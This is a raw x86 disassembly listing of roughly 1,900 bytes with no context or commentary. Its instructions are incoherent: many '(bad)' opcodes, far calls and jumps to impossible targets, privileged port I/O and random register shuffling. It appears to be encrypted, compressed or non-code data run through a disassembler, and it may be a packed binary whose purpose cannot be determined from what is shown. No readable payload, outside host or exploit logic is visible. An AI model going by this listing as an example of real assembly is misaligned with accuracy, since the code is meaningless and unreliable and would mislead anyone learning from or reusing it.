  402f82:	jno    0x402f87
  402f84:	daa    
  402f85:	pop    ss
  402f86:	enter  0x3372,0x5d
  402f8a:	pop    es
  402f8b:	jo     0x402fcd
  402f8d:	stc    
  402f8e:	cmp    DWORD PTR [esi+edi*2],0x2aeb1c34
  402f95:	and    DWORD PTR [ecx+0x35018390],ebx
  402f9b:	js     0x40300d
  402f9d:	call   0x5f78:0x35c963ed
  402fa4:	leave  
  402fa5:	xchg   esp,eax
  402fa6:	or     al,0x50
  402fa8:	mov    ds:0xa5d09397,eax
  402fad:	pop    ss
  402fae:	int3   
  402faf:	(bad)  
  402fb0:	pop    edx
  402fb1:	push   DWORD PTR [edx]
  402fb3:	xchg   ebp,eax
  402fb4:	pop    ebx
  402fb5:	nop
  402fb6:	jne    0x402ffa
  402fb8:	adc    DWORD PTR [eax+0xcec94e7],edx
  402fbe:	xchg   ebx,eax
  402fbf:	inc    eax
  402fc0:	and    eax,DWORD PTR [ebx]
  402fc2:	or     eax,0x8c903311
  402fc7:	pop    ds
  402fc8:	fild   DWORD PTR [edi+0x43]
  402fcb:	add    al,0x5
  402fcd:	add    cl,dl
  402fcf:	xor    al,0x96
  402fd1:	fistp  WORD PTR [esi]
  402fd3:	dec    eax
  402fd4:	retf   
  402fd5:	(bad)  
  402fd6:	loope  0x403018
  402fd8:	call   0x64b2a46c
  402fdd:	or     ch,BYTE PTR [ecx-0x66]
  402fe0:	mov    edx,DWORD PTR [ecx+0x54]
  402fe3:	inc    ecx
  402fe4:	xor    eax,0x340e4030
  402fe9:	mov    ebx,0xd34d2766
  402fee:	lods   eax,DWORD PTR ds:[esi]
  402fef:	sub    al,0x2
  402ff1:	pop    ds
  402ff2:	data16 je 0x403016
  402ff5:	sbb    eax,0xbe937016
  402ffa:	daa    
  402ffb:	cvtps2pd xmm2,QWORD PTR [edi]
  402ffe:	or     DWORD PTR [ecx+0xa],esi
  403001:	call   0xdebb:0x8fc10720
  403008:	stc    
  403009:	test   al,0x7f
  40300b:	clc    
  40300c:	sub    bh,BYTE PTR [esi+eax*8-0x47c63a5]
  403013:	add    DWORD PTR [ebp-0x1f],edi
  403016:	sbb    cl,BYTE PTR [edx]
  403018:	outs   dx,DWORD PTR ds:[esi]
  403019:	or     al,BYTE PTR [edi]
  40301b:	dec    ebx
  40301c:	cmp    eax,ebx
  40301e:	dec    eax
  40301f:	dec    esi
  403020:	dec    DWORD PTR [esi]
  403022:	sbb    eax,0xffffffe0
  403025:	fmulp  st(1),st
  403027:	sub    eax,ebx
  403029:	cmp    edi,eax
  40302b:	orps   xmm0,XMMWORD PTR [ebx]
  40302e:	shr    BYTE PTR ds:0x7845c0f1,cl
  403034:	dec    ebp
  403035:	or     BYTE PTR [ecx+0x34e9488a],dl
  40303b:	pushf  
  40303c:	jmp    0xb1bc:0x46512f8d
  403043:	sub    esp,eax
  403045:	call   0xd708:0x332247e2
  40304c:	push   es
  40304d:	pop    ecx
  40304e:	pop    edi
  40304f:	and    bl,ah
  403051:	dec    ebp
  403052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403053:	adc    al,0x3b
  403055:	fadd   DWORD PTR [ebx+0x4c]
  403058:	add    ecx,ecx
  40305a:	mov    edx,DWORD PTR [eax+eiz*8]
  40305d:	mov    ecx,0x51177aaf
  403062:	(bad)  
  403063:	or     ebp,DWORD PTR [ebx]
  403065:	test   eax,0x95d706c1
  40306a:	xchg   ebp,eax
  40306b:	jg     0x4030c0
  40306d:	mov    cl,BYTE PTR [edi-0x4a45cad8]
  403073:	rol    ebp,1
  403075:	adc    ecx,esp
  403077:	jl     0x40308a
  403079:	lea    ebx,[esi]
  40307b:	push   es
  40307c:	mov    bh,0xc8
  40307e:	les    eax,FWORD PTR [ebp-0x75]
  403081:	adc    bh,BYTE PTR [edi-0x4faff3ca]
  403087:	(bad)  
  403088:	(bad)  
  403089:	cmc    
  40308a:	jg     0x403073
  40308c:	stc    
  40308d:	(bad)  
  40308e:	jle    0x40303a
  403090:	add    cl,BYTE PTR [ebp-0x32d9f3a9]
  403096:	or     al,0xc3
  403098:	mov    al,0x41
  40309a:	sub    edx,DWORD PTR [ebx+0x65031b2b]
  4030a0:	xchg   esp,eax
  4030a1:	and    al,0x1e
  4030a3:	sbb    edi,DWORD PTR [ebx]
  4030a5:	loopne 0x403061
  4030a7:	cmc    
  4030a8:	lock das 
  4030aa:	jl     0x403055
  4030ac:	loopne 0x403061
  4030ae:	mov    dl,BYTE PTR [esi+0x1]
  4030b1:	cmp    al,0xdd
  4030b3:	and    eax,0x3e740b3c
  4030b8:	cmp    al,0xc
  4030ba:	int    0xf6
  4030bc:	aaa    
  4030bd:	mov    eax,0xd0d3c7a
  4030c2:	cmp    al,0xe
  4030c4:	je     0x40313c
  4030c6:	cmp    al,0xf
  4030c8:	sub    al,0x84
  4030ca:	cmp    al,0xb7
  4030cc:	lods   eax,DWORD PTR ds:[esi]
  4030cd:	jmp    0x8b474288
  4030d2:	imul   ebp,ecx,0x660142e6
  4030d8:	jg     0x4030e4
  4030da:	imul   DWORD PTR [ebp-0x44]
  4030dd:	dec    eax
  4030de:	bound  edx,QWORD PTR [eax]
  4030e0:	mov    edi,0x1c540bca
  4030e5:	ds jbe 0x4030ae
  4030e8:	leave  
  4030e9:	icebp  
  4030ea:	pop    es
  4030eb:	(bad)  
  4030ec:	ja     0x403107
  4030ee:	xor    ecx,DWORD PTR [eax-0x15]
  4030f1:	outs   dx,BYTE PTR ds:[esi]
  4030f2:	adc    bl,bl
  4030f4:	scas   eax,DWORD PTR es:[edi]
  4030f5:	aam    0x13
  4030f7:	and    al,0x81
  4030f9:	xor    eax,0xe3f3a4f4
  4030fe:	fld    TBYTE PTR [esi+0x6f]
  403101:	call   DWORD PTR [ebp-0x77]
  403104:	aad    0x8b
  403106:	push   esp
  403107:	or     dl,BYTE PTR cs:0xfd2e5c03
  40310e:	dec    esp
  40310f:	rcl    BYTE PTR cs:[edx],1
  403112:	les    eax,FWORD PTR [ecx+0x1c16fb99]
  403118:	call   0x1d821c7a
  40311d:	sbb    edx,edx
  40311f:	mov    esi,0xfc453b65
  403124:	adc    eax,0x4422bf0
  403129:	pop    ecx
  40312a:	imul   ebx,edi,0x29
  40312d:	inc    esi
  40312e:	inc    edx
  40312f:	sbb    al,0xe
  403131:	sbb    eax,0xe0755910
  403136:	in     eax,0x3b
  403138:	inc    eax
  403139:	icebp  
  40313a:	jmp    0x403147
  40313c:	(bad)  
  40313e:	jo     0x403186
  403140:	jo     0x4030fe
  403142:	or     cl,BYTE PTR [edi+0x1c]
  403145:	jmp    0xa1593f93
  40314a:	inc    ebx
  40314b:	unpcklps xmm2,XMMWORD PTR [esp+edi*8]
  40314f:	push   edx
  403150:	mov    cl,0x4e
  403152:	mov    eax,DWORD PTR [eax-0x72febe1a]
  403158:	jl     0x403162
  40315a:	fild   DWORD PTR [esi]
  40315c:	push   cs
  40315d:	cs pop esi
  40315f:	outs   dx,DWORD PTR ds:[esi]
  403160:	cld    
  403161:	xchg   al,al
  403163:	push   ecx
  403164:	add    eax,DWORD PTR [edi+ecx*1]
  403167:	scas   eax,DWORD PTR es:[edi]
  403168:	cs lock sub ecx,eax
  40316c:	jle    0x403179
  40316e:	pop    ebp
  40316f:	add    eax,esi
  403171:	pop    eax
  403172:	xchg   esi,eax
  403173:	inc    edi
  403174:	test   DWORD PTR [ebx+0x34],ecx
  403177:	inc    ebp
  403178:	and    edx,DWORD PTR [edx]
  40317a:	mov    eax,0x972bf980
  40317f:	xchg   edi,eax
  403180:	xchg   edi,eax
  403181:	mov    bh,0x31
  403183:	add    al,0xb
  403185:	je     0x4031c4
  403187:	or     al,0x74
  403189:	dec    ecx
  40318a:	or     eax,0x740e5574
  40318f:	xchg   esi,eax
  403190:	int    0x34
  403192:	xchg   esp,eax
  403193:	jo     0x4031c5
  403195:	or     BYTE PTR [eax],0x11
  403198:	mov    BYTE PTR [esi],dl
  40319a:	bound  esp,QWORD PTR [edi-0x6a976e9a]
  4031a0:	shl    DWORD PTR [eax],cl
  4031a2:	std    
  4031a3:	stos   BYTE PTR es:[edi],al
  4031a4:	sbb    BYTE PTR [edx+esi*4],dl
  4031a7:	test   ebx,esp
  4031a9:	jmp    0x403228
  4031ab:	ds enter 0x8793,0x10
  4031b0:	xor    ebp,DWORD PTR [esp+ebp*2-0x73]
  4031b4:	aaa    
  4031b5:	add    al,0xb8
  4031b7:	adc    BYTE PTR [eax+edx*8-0x6a487b0],bh
  4031be:	clc    
  4031bf:	push   esp
  4031c1:	add    bh,bh
  4031c3:	je     0x403152
  4031c5:	push   ds
  4031c6:	(bad)  
  4031c7:	ror    BYTE PTR [esp+edi*8+0x9],1
  4031cb:	and    edi,DWORD PTR [eax]
  4031cd:	cmp    BYTE PTR [ecx],dh
  4031cf:	xchg   ebx,eax
  4031d0:	xchg   ebp,eax
  4031d1:	jbe    0x403184
  4031d3:	cmp    ebx,DWORD PTR [edi]
  4031d5:	pop    ss
  4031d6:	add    dl,BYTE PTR [ecx+0x77]
  4031d9:	cmp    al,0x1c
  4031db:	mov    ch,0x93
  4031dd:	xchg   DWORD PTR [ebp+0x18],ebp
  4031e0:	and    bl,BYTE PTR [edx+0x42]
  4031e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e4:	adc    DWORD PTR [edi],ebx
  4031e6:	push   0x10
  4031e8:	xchg   ecx,eax
  4031e9:	xchg   DWORD PTR [edx],edx
  4031eb:	cmp    edi,DWORD PTR [ebx+ebx*8-0x75]
  4031ef:	jo     0x40323e
  4031f1:	outs   dx,DWORD PTR ds:[esi]
  4031f2:	xor    cl,BYTE PTR [ebp+0xf]
  4031f5:	test   DWORD PTR [edi*8+0x4babe959],edx
  4031fc:	and    BYTE PTR [edx+0x6d],0x18
  403200:	jmp    0x19fe:0xc99e1fe8
  403207:	and    cl,BYTE PTR [ebx-0x75ebdb94]
  40320d:	psadbw mm0,QWORD PTR [ebx+0x52]
  403211:	cmp    DWORD PTR [esp+eiz*8+0x79],esp
  403215:	popa   
  403216:	jge    0x4031a9
  403218:	pushf  
  403219:	xchg   BYTE PTR [eax+0x17],bl
  40321c:	or     ebp,DWORD PTR [esi+edx*1]
  40321f:	cmc    
  403220:	lods   eax,DWORD PTR ds:[esi]
  403221:	jb     0x4031b3
  403223:	fisttp QWORD PTR [ebp-0x64]
  403226:	dec    ebp
  403227:	jne    0x403217
  403229:	push   ss
  40322a:	cmp    DWORD PTR [ebx],esp
  40322c:	xor    ebp,DWORD PTR [ebp+eiz*2-0x75]
  403230:	sbb    eax,0xd37aeb4e
  403235:	(bad)  
  403236:	adc    edx,DWORD PTR [eax]
  403238:	loope  0x4032a7
  40323a:	call   0xe2a642dd
  40323f:	dec    edi
  403240:	cwde   
  403241:	cmp    DWORD PTR [edx],eax
  403243:	sbb    al,0x93
  403245:	outs   dx,DWORD PTR ds:[esi]
  403246:	sub    eax,0xff087d8e
  40324b:	ja     0x403251
  40324d:	std    
  40324e:	add    ebx,DWORD PTR [edi]
  403250:	add    DWORD PTR [eax],esp
  403252:	jmp    0x78b5:0x886c45eb
  403259:	pop    ss
  40325a:	into   
  40325b:	clc    
  40325c:	les    eax,FWORD PTR [edi+0x1]
  40325f:	pusha  
  403260:	imul   esp,DWORD PTR ds:0x238386e,0xffffff87
  403267:	add    ebx,DWORD PTR [eiz*8-0x1986d109]
  40326e:	sub    BYTE PTR [ebp+0x42],ah
  403271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403272:	adc    al,0x13
  403274:	xor    BYTE PTR [edi],cl
  403276:	fisub  WORD PTR [ecx-0x7a]
  403279:	or     DWORD PTR ds:0x80d6adec,edx
  40327f:	sbb    al,0xcd
  403281:	loopne 0x403213
  403283:	mov    al,0x11
  403285:	sub    eax,eax
  403287:	test   esi,edi
  403289:	sbb    bh,0x77
  40328c:	mul    DWORD PTR [esp]
  40328f:	mov    ecx,eax
  403291:	jb     0x4032f7
  403293:	and    al,0xc
  403295:	cwde   
  403296:	pop    edx
  403297:	jmp    0x4032ca
  403299:	pop    ss
  40329a:	or     DWORD PTR [eax],0xffffffca
  40329d:	pop    ecx
  40329e:	pop    ecx
  40329f:	hlt    
  4032a0:	sub    al,0x5e
  4032a2:	je     0x4032db
  4032a4:	test   BYTE PTR [ebx+0x4858394a],cl
  4032aa:	and    DWORD PTR [ebx],0x46
  4032ad:	mov    cl,0x2d
  4032af:	outs   dx,BYTE PTR ds:[esi]
  4032b0:	or     BYTE PTR [ebp+0x17027aeb],bl
  4032b6:	mov    ds:0x7a34730,eax
  4032bb:	add    DWORD PTR [ecx-0x1b9c8588],0x53c74d77
  4032c5:	fild   DWORD PTR [ecx]
  4032c7:	sub    dl,BYTE PTR [esi+0x29]
  4032ca:	pop    es
  4032cb:	call   0x964710fc
  4032d0:	pusha  
  4032d1:	mov    ebx,DWORD PTR [eax]
  4032d3:	stos   DWORD PTR es:[edi],eax
  4032d4:	sbb    ebp,DWORD PTR [edx+0x7fe0b007]
  4032da:	div    DWORD PTR [ebp+0x241b82d7]
  4032e0:	pop    ebx
  4032e1:	or     BYTE PTR [eax+0x3b],0x29
  4032e5:	xor    edi,edi
  4032e7:	cmp    DWORD PTR [ebp-0x18],0xffffffeb
  4032eb:	pop    edx
  4032ec:	rcr    BYTE PTR [ebx],0xc0
  4032ef:	or     eax,0x32936d83
  4032f4:	cmp    BYTE PTR [eax],cl
  4032f6:	rcr    BYTE PTR [eax-0x3f],cl
  4032f9:	aas    
  4032fa:	clc    
  4032fb:	movzx  eax,BYTE PTR [eax+0x1]
  4032ff:	add    DWORD PTR [edi+0x3344b70],eax
  403305:	gs loopne 0x403358
  403308:	push   es
  403309:	outs   dx,DWORD PTR ds:[esi]
  40330a:	fmul   QWORD PTR [esi]
  40330c:	les    ebp,FWORD PTR [esi]
  40330e:	loopne 0x403315
  403310:	ss (bad) 
  403312:	imul   esi
  403314:	xchg   DWORD PTR [ebp-0x132df0ff],edi
  40331a:	mov    esp,0x5f74f03b
  40331f:	adc    DWORD PTR [esi+0x106d8dd8],0x8
  403326:	push   ecx
  403327:	or     BYTE PTR [ebp-0x7d],cl
  40332a:	cmp    BYTE PTR [edx+0x3c],dh
  40332d:	fist   WORD PTR [ebx]
  40332f:	cld    
  403330:	out    0x7,al
  403332:	sub    ah,ah
  403334:	cmp    edi,ebx
  403336:	jle    0x403357
  403338:	iret   
  403339:	sbb    DWORD PTR [edi],edx
  40333b:	sar    BYTE PTR [ebx-0x75],0x2f
  40333f:	inc    ecx
  403340:	mov    ds:0x3d6af0f,al
  403345:	adc    edi,ecx
  403347:	sub    ecx,ebx
  403349:	pop    DWORD PTR [ecx+eax*4+0x68]
  40334d:	pop    es
  40334e:	js     0x4032dd
  403350:	and    eax,0x6edd73ba
  403355:	mov    ebx,DWORD PTR [eax-0x14401bdd]
  40335b:	arpl   WORD PTR [ebx],bp
  40335d:	dec    DWORD PTR [eax+0x14]
  403360:	pop    edx
  403361:	mov    DWORD PTR [edi-0x76ee5fe5],edi
  403367:	jge    0x403359
  403369:	cmp    ebx,DWORD PTR [ebp-0x10]
  40336c:	jge    0x403320
  40336e:	add    al,0x33
  403370:	xlat   BYTE PTR ds:[ebx]
  403371:	or     al,dh
  403373:	dec    esp
  403374:	sub    al,0xc7
  403376:	inc    edi
  403377:	push   edx
  403378:	ins    DWORD PTR es:[edi],dx
  403379:	add    eax,0xc933c01d
  40337e:	cmp    edi,DWORD PTR [eax+0x6c605013]
  403384:	mov    al,0xad
  403386:	push   ss
  403387:	in     eax,0x12
  403389:	push   0x82685d4d
  40338e:	sub    DWORD PTR [ebp+0x2b4da16b],0xffffffce
  403395:	sbb    ch,al
  403397:	pop    ebx
  403398:	and    dl,BYTE PTR [edi-0x49]
  40339b:	sub    DWORD PTR ss:[esi+0x25],edi
  40339f:	call   0xfc02c8df
  4033a4:	push   ds
  4033a5:	sti    
  4033a6:	or     BYTE PTR ss:[ebx+ebp*4],al
  4033aa:	sbb    BYTE PTR [eax],cl
  4033ac:	shr    DWORD PTR [ebx],cl
  4033ae:	xlat   BYTE PTR ds:[ebx]
  4033af:	pop    eax
  4033b0:	mov    BYTE PTR [edi+esi*4],0x60
  4033b4:	lods   eax,DWORD PTR ds:[esi]
  4033b5:	inc    esp
  4033b6:	xchg   ebx,eax
  4033b7:	cvtps2pd xmm6,QWORD PTR [ebx-0xc]
  4033bb:	add    esi,ebx
  4033bd:	aad    0xc2
  4033bf:	fstp   TBYTE PTR [esi+0x28]
  4033c2:	pop    ds
  4033c3:	or     BYTE PTR [edi+edi*8],al
  4033c6:	imul   ecx,DWORD PTR [ebx+0x32],0x1c
  4033ca:	inc    ebx
  4033cb:	xor    esi,esi
  4033cd:	mov    al,0xd6
  4033cf:	jbe    0x403380
  4033d1:	xchg   edx,eax
  4033d2:	aaa    
  4033d3:	lea    eax,[edx+ecx*2]
  4033d6:	adc    al,0xcb
  4033d8:	shl    DWORD PTR [edx],1
  4033da:	ins    BYTE PTR es:[edi],dx
  4033db:	je     0x403365
  4033dd:	inc    esi
  4033de:	daa    
  4033df:	out    0x6a,eax
  4033e1:	dec    edi
  4033e2:	test   DWORD PTR [edi],edi
  4033e4:	bound  eax,QWORD PTR [ebx-0x3d]
  4033e7:	mov    esp,ebp
  4033e9:	rcl    BYTE PTR gs:[ebx+eax*4-0x15],0x78
  4033ef:	or     BYTE PTR [edx],cl
  4033f1:	mov    cl,0x4
  4033f3:	and    bh,dl
  4033f5:	dec    edi
  4033f6:	xor    eax,DWORD PTR [ebx+ecx*8]
  4033f9:	inc    edx
  4033fa:	mov    bl,0xf
  4033fc:	push   esi
  4033fd:	dec    ecx
  4033fe:	daa    
  4033ff:	pop    esi
  403400:	xchg   esp,eax
  403401:	dec    esi
  403402:	sub    dl,BYTE PTR [edi+0x7a]
  403405:	push   esp
  403406:	xchg   esi,eax
  403407:	sub    ecx,DWORD PTR [ebx+0x7e2e7560]
  40340d:	and    al,BYTE PTR [edi]
  40340f:	lds    edi,FWORD PTR [edx-0x7f997c52]
  403415:	xchg   DWORD PTR es:[eax],ebx
  403418:	and    BYTE PTR [edx+0x6b],ah
  40341b:	call   0x14aae420
  403420:	pop    es
  403421:	dec    ebx
  403422:	js     0x4033a5
  403424:	push   ss
  403425:	and    eax,0xff185498
  40342a:	inc    ebx
  40342b:	clc    
  40342c:	xor    al,dl
  40342e:	sbb    al,ch
  403430:	pop    ss
  403431:	mov    ds:0x2cf4e377,eax
  403436:	dec    esi
  403437:	in     al,dx
  403438:	sbb    BYTE PTR [edx+0x1c],ch
  40343b:	shr    BYTE PTR [esp+eax*2],cl
  40343e:	sub    DWORD PTR [ecx-0x28bcd139],0x7e067504
  403448:	sbb    cl,BYTE PTR [ebx]
  40344a:	js     0x403469
  40344c:	push   esp
  40344d:	jle    0x40346b
  40344f:	dec    edi
  403450:	mov    bl,0x8d
  403452:	push   0xfef87281
  403457:	or     eax,0x13a93f7b
  40345c:	mov    esp,0xee812b80
  403461:	mov    ds:0x4463ea9b,eax
  403466:	dec    ah
  403468:	mov    eax,esp
  40346a:	mov    dl,0x2d
  40346c:	ds pusha 
  40346e:	jne    0x4033f6
  403470:	push   0x15
  403472:	push   esp
  403473:	push   0x42
  403475:	inc    ebx
  403476:	jb     0x403453
  403478:	mov    dh,0x44
  40347a:	out    0x10,eax
  40347c:	add    eax,0x2e083b10
  403481:	and    BYTE PTR ds:0x515f2b3a,0x22
  403488:	hlt    
  403489:	inc    edi
  40348a:	icebp  
  40348b:	mov    eax,ds:0xaf302668
  403490:	je     0x4034bd
  403492:	add    eax,0x99fcfca
  403497:	(bad)  
  403498:	push   es
  403499:	or     BYTE PTR [edi+eax*1+0xc],dh
  40349d:	jne    0x4034aa
  40349f:	xchg   ecx,eax
  4034a0:	mov    ds:0x54a6f68d,al
  4034a5:	dec    esi
  4034a6:	or     eax,0xc0583605
  4034ab:	add    al,0xef
  4034ad:	mov    ebp,0x8a5af7fb
  4034b2:	fimul  WORD PTR [esi+0x28]
  4034b5:	sqrtps xmm1,XMMWORD PTR [ebx-0x73]
  4034b9:	jne    0x4034b7
  4034bb:	mov    dh,BYTE PTR [ecx-0x37d9aaee]
  4034c1:	add    DWORD PTR [ecx+ebp*4+0x413b012f],0x50b188a
  4034cc:	cmp    bl,0x5c
  4034cf:	xchg   BYTE PTR [ebp+0x16],ch
  4034d2:	aam    0x5a
  4034d4:	or     al,0x28
  4034d6:	mov    edi,0x31922080
  4034db:	stos   DWORD PTR es:[edi],eax
  4034dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034dd:	scas   al,BYTE PTR es:[edi]
  4034de:	inc    DWORD PTR [edx]
  4034e0:	mov    esi,0xa6add05b
  4034e5:	ds inc eax
  4034e7:	cmp    ah,dl
  4034e9:	cmp    BYTE PTR [esi+0x4419fbe0],bl
  4034ef:	movmskps esi,xmm2
  4034f2:	fmul   QWORD PTR [ecx-0x57]
  4034f5:	mov    edx,0x30a36367
  4034fa:	out    0x85,eax
  4034fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034fd:	cmp    eax,0xed88450
  403502:	push   ebx
  403503:	mov    eax,ds:0xa27eafff
  403508:	clc    
  403509:	push   eax
  40350a:	adc    eax,0x8704dbb
  40350f:	cmp    al,ah
  403511:	xor    BYTE PTR ds:0x6dce3880,cl
  403518:	std    
  403519:	ins    DWORD PTR es:[edi],dx
  40351a:	jnp    0x40355d
  40351c:	pop    es
  40351d:	js     0x403520
  40351f:	pop    esp
  403520:	out    0x27,al
  403522:	aas    
  403523:	or     al,0x18
  403525:	les    ebp,FWORD PTR [edi]
  403527:	sbb    ah,BYTE PTR [edi-0x2b]
  40352a:	cmp    al,0x5c
  40352c:	shl    BYTE PTR [edx+0x22b44d63],0xd
  403533:	or     eax,0x1740f019
  403538:	jecxz  0x403507
  40353a:	push   ds
  40353b:	cmp    ch,dh
  40353d:	cmp    BYTE PTR [ecx],cl
  40353f:	xor    edx,DWORD PTR [esi]
  403541:	leave  
  403542:	xchg   edi,eax
  403543:	int    0x62
  403545:	jg     0x403572
  403547:	pop    ebp
  403548:	cld    
  403549:	lea    eax,[ebx+0x1]
  40354c:	imul   esi,DWORD PTR [eax+esi*2+0x10],0x65a6e350
  403554:	inc    ecx
  403555:	imul   edi,DWORD PTR [ebp-0x14],0x2b
  403559:	call   FWORD PTR [ecx+0x28]
  40355c:	fcomp  QWORD PTR [ebx]
  40355e:	add    eax,0xb73d40c3
  403563:	shr    BYTE PTR [ecx+0x71ecdacd],1
  403569:	inc    edi
  40356a:	push   edi
  40356b:	lock cmp BYTE PTR [ecx],bl
  40356e:	cmp    ah,BYTE PTR [ebp+0x21]
  403571:	cdq    
  403572:	mov    ecx,0x4dfeaa46
  403577:	add    esp,DWORD PTR [edi+ebp*8-0x7c489c94]
  40357e:	adc    dh,BYTE PTR [ebx+edi*2-0x1]
  403582:	pushf  
  403583:	pop    ds
  403584:	(bad)  
  403585:	sub    edi,ebp
  403587:	(bad)  
  403588:	ins    BYTE PTR es:[edi],dx
  403589:	jmp    0x403597
  40358b:	lea    edx,[ebx-0x25]
  40358e:	ret    0x7f50
  403591:	pop    esp
  403592:	mov    BYTE PTR [ebp+ebx*1+0x26b85c32],0x9b
  40359a:	fucom  st(2)
  40359c:	push   cs
  40359d:	mov    DWORD PTR [eax+0x50],ecx
  4035a0:	sub    DWORD PTR [esi+0x40],ebx
  4035a3:	dec    ebp
  4035a4:	les    esp,FWORD PTR [ebp-0x3d]
  4035a7:	pop    edi
  4035a8:	aas    
  4035a9:	inc    eax
  4035aa:	test   esp,ebp
  4035ac:	xor    al,0xe8
  4035af:	gs loopne 0x403537
  4035b2:	dec    ecx
  4035b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035b4:	inc    eax
  4035b5:	or     BYTE PTR [ecx+0x25],0x22
  4035b9:	fisttp WORD PTR [ecx]
  4035bb:	(bad)  
  4035bc:	out    dx,eax
  4035bd:	call   DWORD PTR [edi+0x72656bc8]
  4035c3:	outs   dx,BYTE PTR ds:[esi]
  4035c4:	gs ins BYTE PTR es:[edi],dx
  4035c6:	xor    esi,DWORD PTR [edx]
  4035c8:	cs fs ins BYTE PTR es:[edi],dx
  4035cb:	ins    BYTE PTR es:[edi],dx
  4035cc:	add    ah,al
  4035ce:	gs je  0x40361d
  4035d1:	outs   dx,DWORD PTR ds:[esi]
  4035d2:	outs   dx,BYTE PTR ds:[esi]
  4035d3:	addr16 push eax
  4035d5:	popa   
  4035d6:	pusha  
  4035d7:	mov    ?,eax
  4035d9:	(bad)  
  4035da:	je     0x403644
  4035dc:	dec    esi
  4035dd:	popa   
  4035de:	ins    DWORD PTR es:[edi],dx
  4035df:	gs inc ecx
  4035e1:	adc    edx,edi
  4035e3:	fdiv   st(6),st
  4035e5:	sbb    cl,dh
  4035e7:	push   es
  4035e8:	rcl    edx,0xa8
  4035eb:	fbstp  TBYTE PTR [esi+0x56]
  4035ee:	add    BYTE PTR [esi-0x393304a3],dh
  4035f4:	inc    ebp
  4035f5:	out    dx,al
  4035f6:	adc    DWORD PTR [edi+0x68],esp
  4035f9:	sbb    DWORD PTR [eax+eax*1+0x59],esi
  4035fd:	stos   DWORD PTR es:[edi],eax
  4035fe:	and    al,0x7f
  403600:	xchg   edx,eax
  403601:	inc    eax
  403602:	test   al,0x68
  403604:	add    DWORD PTR [ecx+0x1d],ecx
  403607:	or     al,0xd9
  403609:	or     BYTE PTR [edx+eax*1+0x22],0x3b
  40360e:	les    eax,FWORD PTR [eax]
  403610:	les    esp,FWORD PTR [eax+0x1f670481]
  403616:	inc    ecx
  403617:	mov    ss,edx
  403619:	aas    
  40361a:	push   0xba84fcfe
  40361f:	add    eax,0x8f787b60
  403624:	cwde   
  403625:	mov    BYTE PTR [esi-0x18],al
  403628:	loop   0x4035f3
  40362a:	test   DWORD PTR [edx-0x25f1163],0x60772c66
  403634:	fbstp  TBYTE PTR [edx+0x1de4671f]
  40363a:	add    al,0xc4
  40363c:	mov    bl,0x97
  40363e:	push   esp
  40363f:	mov    bh,0x3
  403641:	repnz add al,bl
  403644:	aas    
  403645:	outs   dx,DWORD PTR ds:[esi]
  403646:	and    DWORD PTR [ecx],ebx
  403648:	mov    cl,0x65
  40364a:	add    BYTE PTR [esi],cl
  40364c:	std    
  40364d:	pop    ds
  40364e:	mov    bl,0xb0
  403650:	cmp    eax,0x6afedfe4
  403655:	add    eax,0x30cf356
  40365a:	clc    
  40365b:	outs   dx,BYTE PTR ds:[esi]
  40365c:	xor    al,0xc2
  40365e:	in     al,dx
  40365f:	in     al,0xc4
  403661:	dec    esi
  403662:	cmp    BYTE PTR [ebp+0x2db70020],0x7d
  403669:	xchg   esi,eax
  40366a:	aaa    
  40366b:	stc    
  40366c:	jge    0x403661
  40366e:	push   esp
  40366f:	or     al,BYTE PTR ds:0xd780fee
  403675:	retf   
  403676:	dec    esp
  403677:	jmp    0xbd62cb9
  40367c:	shl    BYTE PTR [ebp-0x6506afca],1
  403682:	jmp    0x403687
  403684:	int    0x95
  403686:	in     al,0x44
  403688:	cmp    ebp,DWORD PTR [ebx-0x4c]
  40368b:	mov    ebp,0x3b23dc2e
  403690:	or     eax,0xac9508dc
  403695:	add    al,0xa
  403697:	jb     0x403698
  403699:	and    eax,ebx
  40369b:	sbb    DWORD PTR [edi],edi
  40369d:	loopne 0x4036e9
  40369f:	jae    0x403685
  4036a1:	sub    edx,eax
  4036a3:	and    edx,eax
  4036a5:	fisubr DWORD PTR [edi]
  4036a7:	or     DWORD PTR [ebx+0x2923bb9],eax
  4036ad:	add    ecx,DWORD PTR [edi-0x54081327]
  4036b3:	hlt    
  4036b4:	and    al,0x75
  4036b6:	jb     0x40363e
  4036b8:	je     0x403726
  4036ba:	pop    ss
  4036bb:	cmp    ebp,DWORD PTR [ecx-0xcf36bd0]
  4036c1:	sbb    ebp,DWORD PTR ss:[edi]
  4036c4:	push   ecx
  4036c5:	stos   BYTE PTR es:[edi],al
  4036c6:	push   ebp
  4036c7:	pop    eax
  4036c8:	cmp    DWORD PTR [esp+ecx*1+0x679ff809],ebx
  4036cf:	push   ebx
  4036d0:	outs   dx,DWORD PTR ds:[esi]
  4036d1:	data16 je 0x40374b
  4036d4:	popa   
  4036d5:	jb     0x40373c
  4036d7:	daa    
  4036d8:	ror    dl,0xdc
  4036db:	outs   dx,DWORD PTR ds:[esi]
  4036dc:	arpl   WORD PTR gs:[ecx+0x6c],sp
  4036e0:	gs jae 0x4036b1
  4036e3:	sbb    edi,eax
  4036e5:	adc    BYTE PTR [eax-0x1eddbcb7],dh
  4036eb:	inc    eax
  4036ec:	hlt    
  4036ed:	mov    esp,0x6b93d523
  4036f2:	inc    ecx
  4036f3:	adc    al,0xff
  4036f5:	mov    eax,0x78831708
  4036fa:	call   0x35334803
  4036ff:	hlt    
  403700:	inc    ecx
  403701:	mov    bl,0xde
  403703:	push   esi
  403704:	fisub  WORD PTR [ebx-0x287700f7]
  40370a:	push   eax
  40370b:	xor    eax,0xa159f07c
  403710:	adc    esi,DWORD PTR [ecx]
  403712:	test   al,0x52
  403714:	xchg   ebx,eax
  403715:	je     0x40371a
  403717:	std    
  403718:	ficomp WORD PTR [eax+0x2b]
  40371b:	idiv   BYTE PTR [ebx]
  40371d:	(bad)  
  40371e:	jne    0x40373b
  403720:	pop    ss
  403721:	repnz xor bh,BYTE PTR [edx+0x23b9514c]
  403728:	loopne 0x403744
  40372a:	fsubr  st,st(3)
  40372c:	inc    eax
  40372d:	or     DWORD PTR [ebp-0x7a490ec8],ebp
  403733:	aas    
  403734:	cs mov eax,DWORD PTR ss:[edi]
